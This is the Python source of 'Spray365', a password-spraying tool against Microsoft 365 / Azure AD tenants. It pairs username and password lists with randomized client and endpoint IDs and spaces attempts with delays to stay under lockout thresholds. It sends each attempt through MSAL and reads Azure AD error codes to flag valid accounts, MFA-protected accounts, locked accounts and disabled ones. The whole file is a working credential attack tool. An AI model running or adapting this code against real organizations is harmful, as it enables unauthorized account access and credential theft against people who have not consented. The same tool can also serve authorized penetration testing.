from msal import PublicClientApplication
from colorama import Fore
import os
import sys
import argparse
import datetime
import random
import itertools
import json
from json import JSONEncoder

version = "0.0.1-alpha"


class Credential:
    auth_timestamp = None
    auth_trace_id = None
    auth_correlation_id = None

    def __init__(self, domain, username, password, client_id, endpoint, delay, initial_delay=0):
        self.domain = domain
        self.username = username
        self.password = password
        self.client_id = client_id
        self.endpoint = endpoint
        self.delay = delay
        self.initial_delay = initial_delay

    @property
    def email_address(self):
        return "%s@%s" % (self.username, self.domain)

    def authenticate(self, proxies, verify_ssl):

        auth_app = PublicClientApplication(
            self.client_id[1], authority="https://login.microsoftonline.com/organizations")

        scopes = ["%s/.default" %
                  "https://login.microsoftonline.com/organizations"]

        print_spray_cred_output(self)
        raw_result = auth_app.acquire_token_by_username_password(
            username=self.email_address, password=self.password, scopes=scopes)

        if "timestamp" in raw_result:
            self.auth_timestamp = raw_result["timestamp"]

        if "trace_id" in raw_result:
            self.auth_trace_id = raw_result["trace_id"]

        if "correlation_id" in raw_result:
            self.auth_correlation_id = raw_result["correlation_id"]

        # Error codes that also indicate a successful login; see: https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/wiki/Client-Applications#common-invalid-client-errors
        auth_complete_success_error_codes = [7000218]
        auth_partial_success_error_codes = [
            50053,
            50055,
            50057,
            50158,
            50076
        ]

        auth_complete_success = False
        auth_partial_success = False

        if any(e in raw_result["error_codes"] for e in auth_complete_success_error_codes):
            auth_complete_success = True
            auth_partial_success = True
            raw_result.pop("error")  # remove the error
        elif any(e in raw_result["error_codes"] for e in auth_partial_success_error_codes):
            auth_partial_success = True

        result = AuthResult(credential=self)
        result.set_auth_status(
            complete_success=auth_complete_success, partial_success=auth_partial_success)

        if "error_codes" in raw_result:
            result.error_codes = raw_result["error_codes"]

        if "error_description" in raw_result:
            result.raw_error_description = raw_result["error_description"]

        result.process_errors()
        print_spray_cred_output(self, result)
        return result


class CredentialEncoder(JSONEncoder):
    def default(self, o):
        return o.__dict__


class AuthError:
    _error_message = ""
    _error_code = None

    def __init__(self, message, code):
        self._error_message = message
        self._error_code = code

    @property
    def error_message(self):
        return self._error_message

    @property
    def error_code(self):
        return self._error_code


class AuthResult:
    _auth_complete_success = False
    _auth_partial_success = False
    _auth_error = None

    credential = None
    raw_error_description = None
    error_codes = []

    def __init__(self, credential):
        self.credential = credential

    @property
    def auth_partial_success(self):
        return self._auth_partial_success

    @property
    def auth_complete_success(self):
        return self._auth_complete_success

    @property
    def auth_error(self):
        return self._auth_error

    def set_auth_status(self, complete_success, partial_success):
        self._auth_complete_success = complete_success
        self._auth_partial_success = partial_success

    def process_errors(self):
        # Take only the first error code
        error_code = self.error_codes[0]
        message = None

        if error_code == 50034:
            message = "User not found"
        elif error_code == 50053:
            message = "Account locked"
        elif error_code == 50055:
            message = "Account password expired"
        elif error_code == 50057:
            message = "Account disabled"
        elif error_code == 50158:
            message = "External validation failed (conditional access policy)"
        elif error_code == 50076:
            message = "Multi-Factor Authentication Required"
        elif error_code == 50126:
            message = "Invalid credentials"
        else:
            message = "An unknown error occurred"

        self._auth_error = AuthError(message, error_code)


def print_banner():

    possible_colors = [
        Fore.CYAN,
        Fore.GREEN,
        Fore.RED,
        Fore.LIGHTBLUE_EX,
        Fore.LIGHTCYAN_EX,
        Fore.LIGHTGREEN_EX,
        Fore.LIGHTMAGENTA_EX,
        Fore.LIGHTRED_EX,
        Fore.LIGHTYELLOW_EX
    ]

    colors = random.sample(possible_colors, 8)
    colors_tuple = tuple(colors)

    lines = [
        "\n%s███████╗%s██████╗ %s██████╗ %s █████╗ %s██╗   ██╗%s██████╗ %s ██████╗ %s███████╗" % colors_tuple,
        "%s██╔════╝%s██╔══██╗%s██╔══██╗%s██╔══██╗%s╚██╗ ██╔╝%s╚════██╗%s██╔════╝ %s██╔════╝" % colors_tuple,
        "%s███████╗%s██████╔╝%s██████╔╝%s███████║%s ╚████╔╝ %s █████╔╝%s███████╗ %s███████╗" % colors_tuple,
        "%s╚════██║%s██╔═══╝ %s██╔══██╗%s██╔══██║%s  ╚██╔╝  %s ╚═══██╗%s██╔═══██╗%s╚════██║" % colors_tuple,
        "%s███████║%s██║     %s██║  ██║%s██║  ██║%s   ██║   %s██████╔╝%s ██████╔╝%s███████║" % colors_tuple,
        "%s╚══════╝%s╚═╝     %s╚═╝  ╚═╝%s╚═╝  ╚═╝%s   ╚═╝   %s╚═════╝ %s ╚═════╝ %s╚══════╝" % colors_tuple,
        "%30sBy MarkoH17 (https://github.com/MarkoH17)" % colors[3],
        "%s%sVersion: %s\n" % ((" " * (57 - len(version))), colors[3], version)
    ]
    [print(line) for line in lines]
    sys.stdout.write(Fore.RESET)


def initialize():
    parser = argparse.ArgumentParser(
        prog="spray365.py",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    mode_argument_group = parser.add_mutually_exclusive_group(
        required=True)

    mode_argument_group.add_argument(
        "-g", "--generate", type=str, help="File to store the generated Spray365 execution plan")
    mode_argument_group.add_argument(
        "-s", "--spray", type=str, help="File containing Spray365 execution plan to use for password spraying")

    parser.add_argument("-d", "--domain", type=str,
                        help="Office 365 domain to authenticate against")

    parser.add_argument("-u", "--user_file", type=str,
                        help="File containing usernames to spray (one per line without domain)")

    password_argument_group = parser.add_mutually_exclusive_group()
    password_argument_group.add_argument("-p", "--password", type=str,
                                         help="Password to spray")
    password_argument_group.add_argument("-pf", "--password_file", type=str,
                                         help="File containing passwords to spray (one per line)")

    parser.add_argument("--delay", type=int,
                        help="Delay in seconds to wait between authentication attempts", default=30)
    parser.add_argument("--lockout", type=int,
                        help="Number of account lockouts to observe before aborting spraying session (disable with 0)", default=5)
    parser.add_argument("--logging", type=bool,
                        help="Enable logging to a file", default=True)

    parser.add_argument(
        "--proxy", type=str, help="HTTP Proxy URL (format: http[s]://proxy.address:port)")

    parser.add_argument("--stop_on_success", type=bool,
                        help="Stop password spraying after identifying first usable credential", default=False)

    parser.add_argument("-k", "--verify_ssl", type=bool,
                        help="Enforce valid SSL certificates", default=False)

    parser.add_argument("-cid", "--aad_client", type=str,
                        help="Client ID used during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)

    parser.add_argument("-eid", "--aad_endpoint", type=str,
                        help="Endpoint ID to specify during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)

    parser.add_argument("-S", "--shuffle_auth_order", type=bool,
                        help="Shuffle order of authentication attempts so that each iteration over the user accounts will spray them in a different order, and with a random arrangement of passwords. Be careful with this option, as it reduces the time between successive authentication attempts for a given user to a minimum of DELAY * 1 seconds (a consecutive attempt). Consider using -mD/--min_cred_loop_delay option to enforce a minimum delay", default=False)

    parser.add_argument("-SO", "--shuffle_optimization_attempts", type=int,
                        help="Number of random execution plans to generate for identifying the fastest execution plan", default=10)

    parser.add_argument("-mD", "--min_cred_loop_delay", type=int,
                        help="Minimum time to wait between successive attempts per user authentication attempt (disable with 0)", default=0)

    parser.add_argument("-R", "--resume_index", type=int,
                        help="Position in the execution plan to start spraying credentials from", default=0)

    args = parser.parse_args()
    validate_args(args)
    main(args)


def validate_args(args):
    if args.generate is not None:
        # Validate args needed for generation
        generate_arg_valid = args.generate is not None and not os.path.isfile(
            args.generate)

        domain_arg_valid = args.domain is not None
        user_arg_valid = args.user_file is not None and os.path.isfile(
            args.user_file)
        password_arg_valid = (
            (args.password_file is not None and os.path.isfile(args.password_file)) or
            (args.password is not None)
        )

        delay_arg_valid = args.delay is not None and args.delay >= 0

        min_cred_loop_delay_arg_valid = args.min_cred_loop_delay is not None and args.min_cred_loop_delay >= 0
        if not generate_arg_valid:
            print_warning(
                "Generate argument is invalid (does this file already exist?)")
        if not domain_arg_valid:
            print_warning("Domain argument is invalid")
        if not user_arg_valid:
            print_warning("User argument (--user / --user_file) is invalid")
        if not password_arg_valid:
            print_warning(
                "User argument (--password / --password_file) is invalid")
        if not delay_arg_valid:
            print_warning("Delay argument is invalid")

        if not (
            generate_arg_valid and
            domain_arg_valid and
            user_arg_valid and
            password_arg_valid and
            delay_arg_valid and

            min_cred_loop_delay_arg_valid
        ):
            print_error("Arguments are invalid")
            sys.exit(1)
    else:
        # Validate args needed for spraying
        spray_arg_valid = args.spray is not None and os.path.isfile(
            args.spray)

        lockout_arg_valid = args.lockout is not None and args.lockout >= 0

        resume_index_arg_valid = args.resume_index is not None and args.resume_index >= 0

        if not spray_arg_valid:
            print_warning(
                "Spray argument is invalid (does this file exist?)")
        if not lockout_arg_valid:
            print_warning("Lockout argument is invalid")

        if not (
            spray_arg_valid and
            lockout_arg_valid and
            resume_index_arg_valid
        ):
            print_error("Arguments are invalid")
            sys.exit(1)


def get_credential_combinations(domain, usernames, passwords, client_ids, endpoint_ids, delay):
    combinations = []

    client_id_values = list(client_ids.items())
    endpoint_id_values = list(endpoint_ids.items())

    for password in passwords:
        for username in usernames:
            combinations.append(
                Credential(domain, username, password, random.choice(
                    client_id_values), random.choice(endpoint_id_values), delay)
            )
    return combinations


def group_credential_combinations_by_key(combinations, grouping_func):
    sorted_combinations = sorted(combinations, key=grouping_func)

    grouped_combinations = {}
    for key, value in itertools.groupby(sorted_combinations, grouping_func):
        grouped_combinations[key] = list(value)
    return grouped_combinations


def calculate_random_delays(auth_creds, min_delay_time):
    for spray_group in list(auth_creds.keys())[1:]:
        for cred_idx, cred in enumerate(auth_creds[spray_group]):
            previous_cred_vals = next(
                ((c_idx, c) for c_idx, c in enumerate(auth_creds[spray_group - 1]) if c.username == cred.username), None)
            previous_cred_idx = previous_cred_vals[0]

            previous_group_delays = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group - 1][previous_cred_idx:]])
            current_group_delays = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group][:cred_idx]
            ])
            prior_delays = previous_group_delays + current_group_delays

            if prior_delays < min_delay_time:
                additional_needed_delay = min_delay_time - prior_delays
                cred.initial_delay = additional_needed_delay


def get_spray_runtime(auth_creds):
    runtime = 0
    if type(auth_creds) is dict:
        for spray_group in list(auth_creds.keys()):
            group_time = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group]
            ])
            runtime += group_time
    elif type(auth_creds) is list:
        runtime = sum([
            c.delay + c.initial_delay for c in auth_creds
        ])
    return runtime


def process_custom_aad_values(prefix, input_str):
    values = input_str.split(",")
    result = {}
    for i in range(len(values)):
        result["%s%d" % (prefix, i + 1)] = values[i]
    return result


def generate_execution_plan(args):
    password_list = []
    user_list = []
    domain = args.domain

    if args.password:
        password_list.append(args.password)
    else:
        with open(args.password_file, "r") as password_file_handle:
            password_list = password_file_handle.read().splitlines()

    with open(args.user_file, "r") as user_file_handle:
        user_list = user_file_handle.read().splitlines()

    delay = args.delay

    print_info("Generating execution plan for %d credentials.." %
               (len(user_list) * len(password_list)))

    spray_duration = len(user_list) * len(password_list) * delay

    # Source: https://github.com/Gerenios/AADInternals/blob/master/AccessToken_utils.ps1
    endpoint_ids = {
        "aad_graph_api": "https://graph.windows.net",
        "azure_mgmt_api": "https://management.azure.com",
        "cloudwebappproxy": "https://proxy.cloudwebappproxy.net/registerapp",
        "ms_graph_api": "https://graph.microsoft.com",
        "msmamservice": "https://msmamservice.api.application",
        "office_mgmt": "https://manage.office.com",
        "officeapps": "https://officeapps.live.com",
        "outlook": "https://outlook.office365.com",
        "sara": "https://api.diagnostics.office.com",
        "spacesapi": "https://api.spaces.skype.com",
        "webshellsuite": "https://webshell.suite.office.com",
        "windows_net_mgmt_api": "https://management.core.windows.net"
    }

    client_ids = {
        "aad_account": "0000000c-0000-0000-c000-000000000000",
        "aad_brokerplugin": "6f7e0f60-9401-4f5b-98e2-cf15bd5fd5e3",
        "aad_cloudap": "38aa3b87-a06d-4817-b275–7a316988d93b",
        "aad_join": "b90d5b8f-5503-4153-b545-b31cecfaece2",
        "aad_pinredemption": "06c6433f-4fb8-4670-b2cd-408938296b8e",
        "aadconnectv2": "6eb59a73-39b2-4c23-a70f-e2e3ce8965b1",
        "aadrm": "90f610bf-206d-4950-b61d-37fa6fd1b224",
        "aadsync": "cb1056e2-e479-49de-ae31-7812af012ed8",
        "adibizaux": "74658136-14ec-4630-ad9b-26e160ff0fc6",
        "apple_internetaccounts": "f8d98a96-0999-43f5-8af3-69971c7bb423",
        "az": "1950a258-227b-4e31-a9cf-717495945fc2",
        "azure_mgmt": "84070985-06ea-473d-82fe-eb82b4011c9d",
        "azure_mobileapp_android": "0c1307d4-29d6-4389-a11c-5cbe7f65d7fa",
        "azureadmin": "c44b4083-3bb0-49c1-b47d-974e53cbdf3c",
        "azuregraphclientint": "7492bca1-9461-4d94-8eb8-c17896c61205",
        "azuremdm": "29d9ed98-a469-4536-ade2-f981bc1d605e",
        "dynamicscrm": "00000007-0000-0000-c000-000000000000",
        "exo": "a0c73c16-a7e3-4564-9a95-2bdf47383716",
        "graph_api": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "intune_mam": "6c7e8096-f593-4d72-807f-a5f86dcc9c77",
        "ms_authenticator": "4813382a-8fa7-425e-ab75-3b753aab3abb",
        "ms_myaccess": "19db86c3-b2b9-44cc-b339-36da233a3be2",
        "msdocs_tryit": "7f59a773-2eaf-429c-a059-50fc5bb28b44",
        "msmamservice": "27922004-5251-4030-b22d-91ecd9a37ea4",
        "o365exo": "00000002-0000-0ff1-ce00-000000000000",
        "o365spo": "00000003-0000-0ff1-ce00-000000000000",
        "o365suiteux": "4345a7b9-9a63-4910-a426-35363201d503",
        "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "office_mgmt": "389b1b32-b5d5-43b2-bddc-84ce938d6737",
        "office_mgmt_mobile": "00b41c95-dab0-4487-9791-b9d2c32c80f2",
        "office_online": "bc59ab01-8403-45c6-8796-ac3ef710b3e3",
        "office_online2": "57fb890c-0dab-4253-a5e0-7188c88b2bb4",
        "onedrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
        "patnerdashboard": "4990cffe-04e8-4e8b-808a-1175604b879",
        "powerbi_contentpack": "2a0c3efa-ba54-4e55-bdc0-770f9e39e9ee",
        "pta": "cb1056e2-e479-49de-ae31-7812af012ed8",
        "sara": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "skype": "d924a533-3729-4708-b3e8-1d2445af35e3",
        "sp_mgmt": "9bc3ab49-b65d-410a-85ad-de819febfddc",
        "synccli": "1651564e-7ce4-4d99-88be-0a65050d8dc3",
        "teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "teams_client": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "teamswebclient": "5e3ce6c0-2b1f-4285-8d4b-75ee78787346",
        "webshellsuite": "89bee1f7-5e6e-4d8a-9f3d-ecd601259da7",
        "windows_configdesigner": "de0853a1-ab20-47bd-990b-71ad5077ac7b",
        "www": "00000006-0000-0ff1-ce00-000000000000",
    }

    if args.aad_client:
        client_ids = process_custom_aad_values("custom_cid_", args.aad_client)

    if args.aad_endpoint:
        endpoint_ids = process_custom_aad_values(
            "custom_eid_", args.aad_endpoint)

    auth_creds = {}

    if args.shuffle_auth_order:
        optimization_tries = args.shuffle_optimization_attempts

        temp_auth_creds = {}
        possible_auth_creds = {}

        for i in range(0, optimization_tries):
            print_info("Generated potential execution plan %d/%d" %
                       (i+1, optimization_tries))
            raw_combinations = get_credential_combinations(
                domain, user_list, password_list, client_ids, endpoint_ids, delay)
            # Generate all combinations of users passwords, then
            # Group them into entire sets of users
            auth_combinations_by_user = group_credential_combinations_by_key(
                raw_combinations, lambda cred: cred.username)

            for user in auth_combinations_by_user.keys():
                random.shuffle(auth_combinations_by_user[user])

            group_index = 0
            while sum([len(auth_combinations_by_user[u]) for u in auth_combinations_by_user.keys()]) > 0:
                cred_grouping = []
                users = list(auth_combinations_by_user.keys())
                random.shuffle(users)

                while users:
                    random_user_index = random.randrange(0, len(users))
                    user = users.pop(random_user_index)

                    random_cred_index = random.randrange(
                        0, len(auth_combinations_by_user[user]))
                    random_cred = auth_combinations_by_user[user].pop(
                        random_cred_index)

                    cred_grouping.append(random_cred)
                temp_auth_creds[group_index] = cred_grouping
                group_index += 1

            calculate_random_delays(temp_auth_creds, args.min_cred_loop_delay)

            runtime = get_spray_runtime(temp_auth_creds)
            possible_auth_creds[i] = (runtime, temp_auth_creds)
        runtimes = [(spray_attempt[1][0], spray_attempt[0])
                    for spray_attempt in possible_auth_creds.items()]

        fastest_runtime = min(runtimes)
        slowest_runtime = max(runtimes)
        auth_creds = possible_auth_creds[fastest_runtime[1]][1]

        print_info("Optimal execution plan identified (#%d)" %
                   (fastest_runtime[1]+1))
        print_info("Spraying will take %d seconds, %d seconds faster than the slowest execution plan generated" % (
            fastest_runtime[0],
            (slowest_runtime[0] - fastest_runtime[0])
        ))
        print_info("This random execution plan will take %d seconds longer than spraying with a simple (non-random) execution plan" %
                   (fastest_runtime[0] - spray_duration))

    else:
        raw_combinations = get_credential_combinations(
            domain, user_list, password_list, client_ids, endpoint_ids, delay)

        auth_combinations_by_password = group_credential_combinations_by_key(
            raw_combinations, lambda cred: cred.password)
        auth_creds = auth_combinations_by_password
        print_info("Simple execution plan identified")
        print_info("Spraying will take %d seconds" % spray_duration)

    # Save the execution plan, auth_creds to a file

    cred_execution_plan = []

    for auth_cred_group in auth_creds.keys():
        cred_execution_plan.extend(auth_creds[auth_cred_group])

    json_execution_plan = json.dumps(
        cred_execution_plan, default=lambda o: o.__dict__)
    with open(args.generate, "w") as execution_plan_file:
        execution_plan_file.write(json_execution_plan)
    print_info("Execution plan with %d credentials saved to file '%s'" %
               (len(cred_execution_plan), args.generate))

    '''
    
    for auth_cred_group in auth_creds.keys():
        for cred in auth_creds[auth_cred_group]:
            print("%s:%s (total delay: %d) (before delay: %d) (after delay: %d) " % (
                cred.username, cred.password, (cred.initial_delay + cred.delay), cred.initial_delay, cred.delay))
        print()
    '''


def decode_execution_plan_item(credential_dict):
    return Credential(**credential_dict)


def export_auth_results(auth_results):
    export_file = "spray365_results_%s.json" % datetime.datetime.now().strftime(
        "%Y-%m-%d_%H-%M-%S")

    json_execution_plan = json.dumps(
        auth_results, default=lambda o: o.__dict__)
    with open(export_file, "w") as execution_plan_file:
        execution_plan_file.write(json_execution_plan)

    print_info("Authentication results file '%s'" %
               export_file)


def spray_execution_plan(args):
    print_info("Processing execution plan '%s'" % args.spray)
    execution_plan_file_path = args.spray

    with open(execution_plan_file_path, "r") as execution_plan_file:
        execution_plan_lines = execution_plan_file.readlines()

    execution_plan_str = ""

    for line in execution_plan_lines:
        execution_plan_str += line.strip("\r").strip("\n")

    auth_creds = json.loads(
        execution_plan_str, object_hook=decode_execution_plan_item)

    resume_index = args.resume_index

    number_of_creds_to_spray = len(auth_creds)
    print_info("Identified %d credentials in the provided execution plan" %
               number_of_creds_to_spray)

    if resume_index and resume_index > number_of_creds_to_spray:
        print_error("Resume index '%d' is larger than the number of credentials (%d) in the execution plan % " % (
            resume_index, number_of_creds_to_spray))

    if resume_index:
        print_info("Password spraying will continue with credential %d out of %d" % (
            resume_index, number_of_creds_to_spray))

    estimated_spray_duration = get_spray_runtime(
        auth_creds[resume_index:])
    spray_completion_datetime = (datetime.datetime.now(
    ) + datetime.timedelta(seconds=estimated_spray_duration)).strftime("%Y-%m-%d %H:%M:%S")

    print_info("Password spraying will take at least %d seconds, and should finish around %s" %
               (estimated_spray_duration, spray_completion_datetime))

    lockout_threshold = args.lockout
    if lockout_threshold:
        print_info("Lockout threshold is set to %d accounts" %
                   (lockout_threshold))
    else:
        print_warning("Lockout threshold is disabled")

    print_info("Starting to spray credentials")

    global global_spray_size
    global_spray_size = len(auth_creds)

    global global_spray_idx
    global_spray_idx = 1

    auth_results = []
    for attempt_idx, attempt in enumerate(auth_creds):
        result = attempt.authenticate(None, None)
        auth_results.append(result)
        global_spray_idx += 1
    export_auth_results(auth_results)


def main(args):
    generate_mode = args.generate is not None

    if(generate_mode):
        generate_execution_plan(args)
    else:
        spray_execution_plan(args)


def print_error(message, fatal=True):
    print("%s[%s - ERROR]: %s" % (Fore.RED, get_time_str(), message))
    if fatal:
        sys.exit(1)


def print_warning(message):
    print("%s[%s - WARN]: %s" %
          (Fore.YELLOW, get_time_str(), message))


def print_info(message, success=False):
    print("%s[%s - INFO]: %s" %
          (Fore.LIGHTBLUE_EX,
           get_time_str(),
           message))


def print_spray_cred_output(credential, auth_result=None):
    if auth_result is None:
        status = "%s(...)" % Fore.BLUE
    elif auth_result.auth_complete_success:
        status = "%s(Success)" % Fore.GREEN
    elif auth_result.auth_partial_success:
        status = "%s(Partial Success)" % Fore.LIGHTYELLOW_EX
    else:
        status = "%s(Failed: %s)" % (
            Fore.RED, auth_result.auth_error.error_message)

    spray_index = str(global_spray_idx).zfill(len(str(global_spray_size)))

    suffix = "\r" if not auth_result else None

    print("%s[%s - SPRAY %s/%d] (%s%s%s->%s%s%s): %s%s / %s%s %s" %
          (
              Fore.LIGHTBLUE_EX,
              get_time_str(),
              spray_index,
              global_spray_size,
              Fore.LIGHTCYAN_EX,
              credential.client_id[0],
              Fore.LIGHTBLUE_EX,
              Fore.LIGHTGREEN_EX,
              credential.endpoint[0],
              Fore.LIGHTBLUE_EX,
              Fore.LIGHTMAGENTA_EX,
              credential.username,
              Fore.LIGHTMAGENTA_EX,
              credential.password,
              status
          ), end=suffix, flush=True if auth_result else False)


def get_time_str():
    date_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return date_str


if __name__ == "__main__":
    print_banner()
    initialize()
